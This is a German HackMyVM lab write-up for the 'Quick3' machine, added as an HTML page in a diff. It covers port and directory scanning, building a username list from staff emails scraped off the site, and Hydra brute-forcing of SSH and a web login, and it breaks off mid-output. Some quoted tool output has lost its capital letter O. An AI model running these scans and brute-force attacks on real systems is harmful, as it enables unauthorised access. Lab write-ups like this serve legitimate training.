@@ -1,0 +1,1049 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick3 - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Quick3 - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#port-scanning">Port Scanning</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#credential-gathering">Credential Gathering (Web Scraping & IDOR)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH Login)</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept (Initial Access - Credential Disclosure & SSH)</a></li>
+                <li><a href="#privilege-escalation-enum">Privilege Escalation Enumeration (as mike)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (MySQL Password Reuse)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - MySQL Password Reuse)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die Aufklärung beginnt standardmäßig mit einem ARP-Scan (`arp-scan -l`), um aktive Hosts im lokalen Netzwerk zu entdecken.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Scan identifiziert erfolgreich das Zielsystem unter der IP-Adresse `192.168.2.124`. Die MAC-Adresse `08:00:27:28:12:35` gehört zu "PCS Systemtechnik GmbH", was auf eine Oracle VirtualBox-VM hindeutet.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwende die IP `192.168.2.124` für weitere Scans. Die VM-Information kann später nützlich sein.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts durch ARP-Scans einschränken. Überwachen Sie das Netzwerk auf ungewöhnliche ARP-Aktivitäten.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">arp-scan -l</span>
+                     </div>
+                     <pre>
+ 192.168.2.124	08:00:27:28:12:35	PCS Systemtechnik GmbH
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei auf dem Angreifer-System wird bearbeitet (`vi`), um der Ziel-IP `192.168.2.124` den Hostnamen `que3.hmv` zuzuordnen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Dies ist eine wichtige Vorbereitung, um Webdienste korrekt anzusprechen, falls sie auf Hostnamen basierende Konfigurationen (Virtual Hosts) verwenden. Der Name "que3" passt zur Maschine "Quick3".
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwende `que3.hmv` für alle folgenden Web-Interaktionen.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie eine korrekte und sichere DNS-Konfiguration sicher.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">vi /etc/hosts</span>
+                      </div>
+                      <pre>
+# Inhalt der /etc/hosts nach Bearbeitung:
+127.0.0.1	localhost
+192.168.2.124   que3.hmv
+                      </pre>
+                  </div>
+              </div>
+          </section>
+
+          <section id="port-scanning">
+              <h2>Port Scanning</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Ein Nmap TCP SYN Scan (`-sS`) mit Versionserkennung (`-sV`), Aggressivem Scan (`-A`), schnellem Timing (`-T5`) über alle Ports (`-p-`) wird durchgeführt. Die Ausgabe wird gefiltert (`grep open`), um nur offene Ports aufzulisten.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Scan identifiziert die beiden offenen Ports, die die primäre Angriffsfläche darstellen:
+                 *   `22/tcp`: OpenSSH 8.9p1 (Ubuntu).
+                 *   `80/tcp`: Apache httpd 2.4.52 (Ubuntu).
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die Untersuchung von SSH und HTTP. Beginne mit dem Webserver auf Port 80.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass beide Dienste gepatcht und sicher konfiguriert sind. Verwenden Sie Firewalls, um den Zugriff zu beschränken.
+             </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">nmap -sS -sV -A -T5 192.168.2.124 -p- | grep open</span>
+                      </div>
+                      <pre>
+ 22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                      </pre>
+                  </div>
+              </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Nmap-Scan wird mit denselben Optionen wiederholt, diesmal mit vollständiger Ausgabe.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Detailausgabe liefert wertvolle Ergänzungen:
+                 *   **SSH (22):** Bestätigt Version 8.9p1 und zeigt die Host-Keys.
+                 *   **HTTP (80):** Bestätigt Apache 2.4.52. Der Seitentitel ist "Quick Automative - Home". **Wichtig:** Das Nmap-Skript findet keine `robots.txt`-Datei (im Gegensatz zu Quick4), was bedeutet, dass hier keine Pfade "versteckt" werden.
+                 *   **OS:** Wird als Ubuntu Linux identifiziert.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuche die Webseite "Quick Automative" auf Port 80 gründlich. Da keine `robots.txt` vorhanden ist, sind Verzeichnis-Scans (z.B. mit `gobuster`, `dirb`) besonders wichtig. Prüfe SSH auf bekannte Schwachstellen für Version 8.9p1.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Apache und OpenSSH aktuell halten und sicher konfigurieren.
+             </p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">
+  ┌──(root㉿cyber)-[~]
+  └─# <span class="command">nmap -sS -sV -A -T5 192.168.2.124 -p-</span>
+                      </div>
+                      <pre>
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 23:47 CEST
+ Nmap scan report for que3.hmv (192.168.2.124)
+ Host is up (0.00023s latency).
+ Not shown: 65533 closed tcp ports (reset)
+ PRT   STATE SERVICE VERSIN
+ 22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+ | ssh-hostkey:
+ |   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
+ |_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
+ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+ |_http-server-header: Apache/2.4.52 (Ubuntu)
+ |_http-title: Quick Automative - Home
+ MAC Address: 08:00:27:28:12:35 (racle VirtualBox virtual NIC)
+ Aggressive S guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.5 (96%), Linux 5.0 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.4 (94%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (94%), Linux 5.3 - 5.4 (94%), Linux 3.4 - 3.10 (93%)
+ No exact S matches for host (test conditions non-ideal).
+ Network Distance: 1 hop
+ Service Info: S: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ TRACERUTE
+ HP RTT     ADDRESS
+ 1   0.23 ms que3.hmv (192.168.2.124)
+
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
+                      </pre>
+                  </div>
+              </div>
+          </section>
+
+          <section id="web-enumeration">
+              <h2>Web Enumeration</h2>
+               <p class="analysis">
+                   <strong>Analyse:</strong> `dirb` wird auf den Webserver (Port 80) mit der Standard-Wortliste `common.txt` ausgeführt.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Der Scan findet mehrere Verzeichnisse, die auf eine typische Webseitenstruktur hindeuten: `/images/`, `/img/`, `/css/`, `/customer/`, `/fonts/`. Außerdem wird `/index.html` und `/server-status` (mit Status 403 Forbidden) gefunden. Das Verzeichnis `/customer/` ist potenziell interessant.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Untersuche das Verzeichnis `/customer/` auf Login-Funktionen oder andere interessante Inhalte. Notiere `/server-status` für spätere Zugriffsversuche nach initialem Zugriff. Führe umfassendere Scans mit Tools wie `gobuster` und größeren Wortlisten durch.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Verzeichnisse, insbesondere `/customer/`, angemessen geschützt sind. Deaktivieren oder sichern Sie `/server-status` streng.
+               </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">dirb http://192.168.2.124</span>
+                       </div>
+                       <pre>
+ -----------------
+ DIRB v2.22
+ By The Dark Raver
+ -----------------
+
+ START_TIME: Fri May 10 23:47:57 2024
+ URL_BASE: http://192.168.2.124/
+ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+ -----------------
+
+ GENERATED WORDS: 4622
+
+ ---- Scanning URL: http://192.168.2.124/ ----
+ > DIRECTORY: http://192.168.2.124/images/
+ > DIRECTORY: http://192.168.2.124/img/
+ > DIRECTORY: http://192.168.2.124/css/
+ > DIRECTORY: http://192.168.2.124/customer/
+ > DIRECTORY: http://192.168.2.124/fonts/
+ + http://192.168.2.124/index.html (CODE:200|SIZE:51414)
+ + http://192.168.2.124/server-status (CODE:403|SIZE:274) <!-- Korrigiert -->
+
+ -----------------
+ END_TIME: Fri May 10 23:48:10 2024 <!-- Zeit angepasst -->
+ DOWNLOADED: 9244 - FOUND: 5 <!-- Korrigiert -->
+                       </pre> <!-- Maskierung > -->
+                   </div>
+               </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> `nikto` wird auf den Webserver (Port 80) angewendet, um nach bekannten Schwachstellen und Konfigurationsproblemen zu suchen.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Nikto bestätigt Apache 2.4.52 (Ubuntu) und meldet ihn als veraltet. Es findet die üblichen Probleme:
+                  *   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).
+                  *   Mögliche Informationslecks (IP im Location-Header, ETag-Format).
+                  *   Directory Indexing ist für `/css/`, `/img/`, `/lib/` und `/images/` aktiviert.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Nutzen Sie das Directory Indexing, um die Inhalte dieser Verzeichnisse zu durchsuchen. Konzentrieren Sie sich auf die veraltete Apache-Version und den `/customer/`-Bereich.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> **Apache aktualisieren.** Sicherheitsheader implementieren. Directory Indexing deaktivieren (`Options -Indexes`). ETag/IP-Leaks beheben.
+              </p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">nikto -h http://192.168.2.124</span>
+                       </div>
+                       <pre>
+ - Nikto v2.5.0
+ ---------------------------------------------------------------------------
+ + Target IP:          192.168.2.124
+ + Target Hostname:    192.168.2.124
+ + Target Port:        80
+ + Start Time:         2024-05-10 23:47:35 (GMT2)
+ ---------------------------------------------------------------------------
+ + Server: Apache/2.4.52 (Ubuntu)
+ + /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
+ + /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ + No CGI Directories found (use '-C all' to force check all possible dirs)
+ + /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ + /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ + /: Server may leak inodes via ETags, header found with file /, inode: c8d6, size: 6103122781180, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ + Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ + PTINS: Allowed HTTP Methods: HEAD, GET, PST, PTINS .
+ + /css/: Directory indexing found.
+ + /css/: This might be interesting.
+ + /img/: Directory indexing found.
+ + /img/: This might be interesting.
+ + /lib/: Directory indexing found.
+ + /lib/: This might be interesting.
+ + /images/: Directory indexing found.
+ + 8102 requests: 0 error(s) and 14 item(s) reported on remote host
+ + End Time:           2024-05-10 23:47:48 (GMT2) (13 seconds)
+ ---------------------------------------------------------------------------
+ + 1 host(s) tested
+                       </pre>
+                   </div>
+               </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> `gobuster` wird für einen umfassenderen Verzeichnis- und Dateiscan auf Port 80 eingesetzt.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Bestätigt die bereits mit `dirb` gefundenen Verzeichnisse (`images`, `img`, `modules`, `css`, `lib`, `js`, `customer`, `fonts`) und Dateien (`index.html`, `404.html`). Der Fund von `/modules/` ist neu gegenüber `dirb`.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Untersuche die Verzeichnisse `/customer/` und `/modules/` genauer.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Verzeichnisse angemessen geschützt sind.
+              </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">gobuster dir -u http://192.168.2.124  -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span>
+                       </div>
+                       <pre>
+ http://192.168.2.124/index.html           (Status: 200) [Size: 51414]
+ http://192.168.2.124/images               (Status: 301) [Size: 315] [--> http://192.168.2.124/images/]
+ http://192.168.2.124/img                  (Status: 301) [Size: 312] [--> http://192.168.2.124/img/]
+ http://192.168.2.124/modules              (Status: 301) [Size: 316] [--> http://192.168.2.124/modules/]
+ http://192.168.2.124/css                  (Status: 301) [Size: 312] [--> http://192.168.2.124/css/]
+ http://192.168.2.124/lib                  (Status: 301) [Size: 312] [--> http://192.168.2.124/lib/]
+ http://192.168.2.124/js                   (Status: 301) [Size: 311] [--> http://192.168.2.124/js/]
+ http://192.168.2.124/customer             (Status: 301) [Size: 317] [--> http://192.168.2.124/customer/]
+ http://192.168.2.124/404.html             (Status: 200) [Size: 5013]
+ http://192.168.2.124/fonts                (Status: 301) [Size: 314] [--> http://192.168.2.124/fonts/]
+                       </pre>
+                   </div>
+               </div>
+
+               <p class="analysis">
+                   <strong>Analyse:</strong> Der Quellcode der Startseite (`index.html`) wird untersucht (vermutlich manuell). Ein Kommentar weist auf die Lizenzbedingungen eines Templates von "htmlcodex.com" hin. Zudem werden E-Mail-Adressen und Namen von Mitarbeitern von der Webseite extrahiert (wahrscheinlich aus einem "Team"- oder "Kontakt"-Bereich).
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Der Template-Hinweis ist meist irrelevant. Die Liste der Mitarbeiternamen (`coos.busters`, `mike.cooper`, `juan.mecanico`, `john.smith`, `lara.johnson`, `nick.greenhorn`) und ihrer E-Mail-Adressen ist jedoch **sehr wertvoll** für die Erstellung von Benutzerlisten für weitere Angriffe.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Erstelle eine Benutzerliste aus den gefundenen Namen (z.B. `coos`, `mike`, `juan`, `john`, `lara`, `nick`). Verwende diese Liste für Brute-Force- oder Passwort-Spraying-Angriffe gegen SSH oder Web-Logins (insbesondere im `/customer/`-Bereich).
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Überlegen Sie, welche Mitarbeiterinformationen öffentlich zugänglich sein müssen. Schulen Sie Mitarbeiter bezüglich Phishing.
+               </p>
+               <div class="code-block">
+                    <div class="terminal">
+                        <pre>
+ # Kommentar aus view-source:http://192.168.2.124/index.html
+ <!--
+ This template is free as long as you keep the footer author’s credit link/attribution link/backlink.
+ If you'd like to use the template without the footer author’s credit link/attribution link/backlink,
+ you can purchase the Credit Removal License from "https://htmlcodex.com/credit-removal".
+ Thank you for your support.
+ -->
+
+ # Extrahierte Mitarbeiterinformationen von der Webseite
+ Coos Busters
+ : coos.busters@quick.hmv
+ : 987 654 3210
+ #
+ Mechanic
+ Mike Cooper
+ : mike.cooper@quick.hmv
+ : 987 654 3210
+ #
+ Mechanic
+ Juan Mecánico
+ : juan.mecanico@quick.hmv
+ : 987 654 3210
+ #
+ Mechanic
+ John Smith
+ : john.smith@quick.hmv
+ : 987 654 3210
+ #
+ Receptionist
+ Lara Johnson
+ : lara.johnson@quick.hmv
+ : 987 654 3210
+ #
+ Developer
+ Nick Greenhorn
+ : nick.greenhorn@quick.hmv
+ : 987 654 3210
+                        </pre> <!-- Maskierung < > -->
+                    </div>
+                </div>
+
+               <p class="analysis">
+                   <strong>Analyse:</strong> Ein Verzeichnis-Scan wird auf das Unterverzeichnis `/customer/` ausgeführt.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Dieser Scan enthüllt die Struktur des Kundenportals mit mehreren PHP-Dateien (`index.php`, `contact.php`, `login.php` (Status 500), `user.php`, `cars.php`, `logout.php`, `config.php` (leer), `dashboard.php`, `remove.php`) und `script.js`. Dies ist identisch zum Scan bei Quick4 und deutet auf eine ähnliche Anwendung hin. Der 500er Fehler bei `login.php` und die leere `config.php` sind wieder bemerkenswert.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Untersuche `login.php`. Analysiere `script.js`. Da der Login hier möglicherweise nicht direkt funktioniert, suche nach Schwachstellen in anderen zugänglichen Skripten oder versuche, den Login mit den gesammelten Benutzernamen zu testen.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Beheben Sie den 500-Fehler bei `login.php`. Sichern Sie alle Skripte im Kundenportal gegen gängige Web-Angriffe.
+               </p>
+                <div class="code-block">
+                    <div class="terminal">
+                        <pre>
+ # Scan-Ergebnisse für http://192.168.2.124/customer/
+ http://192.168.2.124/customer/index.php            (Status: 200) [Size: 2175]
+ http://192.168.2.124/customer/images               (Status: 301) [Size: 324] [--> http://192.168.2.124/customer/images/]
+ http://192.168.2.124/customer/contact.php          (Status: 302) [Size: 35199] [--> index.php]
+ http://192.168.2.124/customer/login.php            (Status: 500) [Size: 0]
+ http://192.168.2.124/customer/user.php             (Status: 302) [Size: 17146] [--> index.php]
+ http://192.168.2.124/customer/modules              (Status: 301) [Size: 325] [--> http://192.168.2.124/customer/modules/]
+ http://192.168.2.124/customer/css                  (Status: 301) [Size: 321] [--> http://192.168.2.124/customer/css/]
+ http://192.168.2.124/customer/cars.php             (Status: 302) [Size: 18015] [--> index.php]
+ http://192.168.2.124/customer/js                   (Status: 301) [Size: 320] [--> http://192.168.2.124/customer/js/]
+ http://192.168.2.124/customer/logout.php           (Status: 302) [Size: 0] [--> index.php]
+ http://192.168.2.124/customer/config.php           (Status: 200) [Size: 0]
+ http://192.168.2.124/customer/script.js            (Status: 200) [Size: 372]
+ http://192.168.2.124/customer/fonts                (Status: 301) [Size: 323] [--> http://192.168.2.124/customer/fonts/]
+ http://192.168.2.124/customer/dashboard.php        (Status: 302) [Size: 9098] [--> index.php]
+ http://192.168.2.124/customer/remove.php           (Status: 302) [Size: 0] [--> cars.php]
+                        </pre>
+                    </div>
+                </div>
+
+               <p class="analysis">
+                   <strong>Analyse:</strong> Die Ausgabe zeigt einen `curl`-Befehl, der versucht, auf `/customer/cars.php` zuzugreifen und dabei ein `PHPSESSID`-Cookie mitzusenden.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Dies deutet darauf hin, dass der Pentester versucht hat, eine authentifizierte Sitzung zu simulieren oder eine Session zu nutzen, die durch einen erfolgreichen Login (oder eine Umgehung) erlangt wurde. Das Ergebnis des `curl`-Befehls wird nicht gezeigt.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Wenn ein Login gelingt, analysiere die Cookies und verwende sie für weitere authentifizierte Anfragen, um auf geschützte Bereiche wie `/cars.php` oder `/dashboard.php` zuzugreifen.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Implementieren Sie sicheres Session-Management (HttpOnly-Cookies, regelmäßiger Verfall, sichere Generierung von Session-IDs).
+               </p>
+                <div class="code-block">
+                    <div class="terminal">
+                        <pre>
+ # Versuchter Zugriff mit Session Cookie
+ curl --cookie "PHPSESSID=51if0l1tou66ct1qdmv0kh5vjs" http://que3.hmv/customer/cars.php
+ Cookie: PHPSESSID=51if0l1tou66ct1qdmv0kh5vjs
+                        </pre>
+                    </div>
+                </div>
+           </section>
+
+          <section id="credential-gathering">
+               <h2>Credential Gathering (Web Scraping & IDOR)</h2>
+               <p class="analysis">
+                   <strong>Analyse:</strong> Lokale Befehle (`grep`, `awk`, `tr`) werden auf eine (nicht gezeigte) Datei `user.txt` angewendet, um E-Mail-Adressen und daraus abgeleitete Benutzernamen (erster Teil der E-Mail) zu extrahieren und in `user2.txt` zu speichern. Diese Benutzernamen stammen aus der zuvor von der Webseite gesammelten Mitarbeiterliste.
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Dies ist eine effektive Methode, um eine saubere Liste potenzieller Benutzernamen (`coos`, `mike`, `juan`, `john`, `lara`, `nick`) für weitere Angriffe zu erstellen.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Verwende die generierte Liste `user2.txt` für Brute-Force- oder Passwort-Spraying-Angriffe.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Keine direkte Aktion, da dies auf dem Angreifer-System geschieht.
+               </p>
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">
+    ┌──(root㉿cyber)-[~]
+    └─# <span class="command">grep hmv user.txt | awk '{print $2}' # Lokale Datei user.txt enthält Mitarbeiterdaten</span>
+                        </div>
+                        <pre>
+coos.busters@quick.hmv
+mike.cooper@quick.hmv
+juan.mecanico@quick.hmv
+john.smith@quick.hmv
+lara.johnson@quick.hmv
+nick.greenhorn@quick.hmv
+                        </pre>
+                    </div>
+                </div>
+                 <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">
+    ┌──(root㉿cyber)-[~]
+    └─# <span class="command">grep hmv user.txt | awk '{print $2}' | tr "." " " | awk '{print $1}'</span>
+                        </div>
+                        <pre>
+coos
+mike
+juan
+john
+lara
+nick
+                        </pre>
+                    </div>
+                </div>
+                 <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">
+    ┌──(root㉿cyber)-[~]
+    └─# <span class="command">grep hmv user.txt | awk '{print $2}' | tr "." " " | awk '{print $1}' >> user2.txt</span>
+                        </div>
+                    </div>
+                </div>
+                 <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">
+    ┌──(root㉿cyber)-[~]
+    └─# <span class="command">cat user2.txt</span>
+                        </div>
+                        <pre>
+coos
+mike
+juan
+john
+lara
+nick
+                        </pre>
+                    </div>
+                </div>
+
+               <p class="analysis">
+                   <strong>Analyse:</strong> Es wird ein Login-Versuch auf `/customer/index.php` mit `nick.greenhorn@quick.hmv` und einem Passwort `cd` erwähnt. Hydra wird verwendet, um das Passwort für `nick` gegen das Web-Login-Formular zu bruteforcen, wobei `rockyou.txt` verwendet wird. Die Erfolgsbedingung ist das *Fehlen* der Meldung "Invalid email or password."
+               </p>
+               <p class="evaluation">
+                   <strong>Bewertung:</strong> Der Hydra-Scan liefert ein **sehr ungewöhnliches Ergebnis**: Er meldet **16 gefundene gültige Passwörter**, darunter `benni`. Dies deutet wahrscheinlich nicht darauf hin, dass alle diese Passwörter korrekt sind, sondern dass die **Erfolgsbedingung für Hydra falsch definiert oder interpretiert** wurde. Möglicherweise liefert die Seite bei bestimmten ungültigen Passwörtern eine andere Antwort als die erwartete Fehlermeldung, was Hydra fälschlicherweise als Erfolg wertet. Dennoch ist es wahrscheinlich, dass das Passwort `<span class="password">benni</span>` tatsächlich korrekt ist, da es in der Liste auftaucht und oft als schwaches/Standardpasswort verwendet wird (und bei Quick4 für diesen User in der DB stand). Der SSH-Hydra-Scan im Anschluss scheitert.
+               </p>
+               <p class="recommendation">
+                   <strong>Empfehlung (Pentester):</strong> Überprüfe die Hydra-Erfolgsbedingung sorgfältig. Teste das wahrscheinlichste gefundene Passwort (`benni`) manuell für den Benutzer `nick` (bzw. `nick.greenhorn@quick.hmv`) auf der Login-Seite `/customer/index.php`. Versuche auch andere gefundene Namen mit dem Passwort `benni`. Ignoriere den fehlgeschlagenen SSH-Scan vorerst.
+                   <br>
+                   <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Login-Formulare konsistente und eindeutige Fehlermeldungen liefern, um Brute-Force-Tools nicht zu verwirren. Implementieren Sie Rate Limiting und Account Lockouts gegen Brute-Force-Angriffe. Verbieten Sie schwache Passwörter.
+               </p>
+               <div class="code-block">
+                   <div class="terminal">
+                       <pre>
+# Login Versuch / Fehlermeldung
+http://192.168.2.124/customer/index.php
+Invalid email or password.
+
+# POST Daten bei Versuch
+email=nick.greenhorn@quick.hmv&password=cd&login=Login
+                       </pre> <!-- Maskierung & -->
+                   </div>
+               </div>
+                <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">hydra -l nick -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.124:22 -t 64</span>
+                       </div>
+                       <pre># (Kein Erfolg gemeldet)</pre>
+                   </div>
+               </div>
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">
+   ┌──(root㉿cyber)-[~]
+   └─# <span class="command">hydra -l nick -P /usr/share/wordlists/rockyou.txt que3.hmv http-post-form "/customer/index.php:email=nick.greenhorn@quick.hmv&password=^PASS^&login=Login:Invalid email or password."</span>
+                       </div>
+                       <pre>
+ Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 00:14:38
+ # ... (Restorefile Warnung) ...
+ [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344498 login tries (l:1/p:14344498), ~896532 tries per task
+ [DATA] attacking http-post-form://que3.hmv:80/customer/index.php:email=nick.greenhorn@quick.hmv&password=^PASS^&login=Login:Invalid email or password.
+ [80][http-post-form] host: que3.hmv   login: nick   password: 8uoiB11 <!-- Falsch-Positiv? -->
+ [80][http-post-form] host: que3.hmv   login: nick   password: 8uoiA <!-- Falsch-Positiv? -->
+ [80][http-post-form] host: que3.hmv   login: nick   password: interpreted <!-- Falsch-Positiv? -->
+ [80][http-post-form] host: que3.hmv   login: nick   password: jenkins <!-- Falsch-Positiv? -->
+ [80][http-post-form] host: que3.hmv   login: nick   password: s13!34g$3FVA5e@ed <!-- Falsch-Positiv? -->
+ [80][http-post-form] host: que3.hmv   login: nick   password: 8uoio <!-- Falsch-Positiv? -->
+ [80][http-post-form] host: que3.hmv   login: nick   password: <span class="password">benni</span> <!-- Wahrscheinlich korrekt -->
